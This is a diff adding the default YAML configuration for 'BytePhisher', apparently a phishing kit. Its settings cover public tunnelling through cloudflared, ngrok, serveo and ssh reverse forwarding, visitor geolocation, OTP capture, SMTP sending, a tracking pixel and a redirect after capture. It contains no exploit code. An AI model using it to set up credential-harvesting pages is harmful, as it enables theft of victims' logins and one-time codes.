@@ -1,0 +1,31 @@
+# BytePhisher default config — override via CLI flags or this file
+port: 8080
+db_path: data/bytephisher.db
+geo_provider: ipapi            # ipapi | ipinfo | off
+otp_default: false
+redirect_url: ""
+tunneler_default: cloudflared
+tunnels:
+  cloudflared:
+    binary: cloudflared
+    auto_download: true
+  ngrok:
+    binary: ngrok
+    auto_download: true
+  localhost_run:
+    binary: ""                # uses `ssh` — no binary needed
+  serveo:
+    binary: ""               # uses `ssh`
+  bore:
+    binary: bore
+    auto_download: true
+  hoplink:
+    binary: ""               # uses `ssh -R 80:URL hoplink.com`
+smtp:
+  host: ""
+  port: 587
+  user: ""
+  pass: ""
+  use_starttls: true
+tracking_pixel: true
+redirect_after_capture: ""
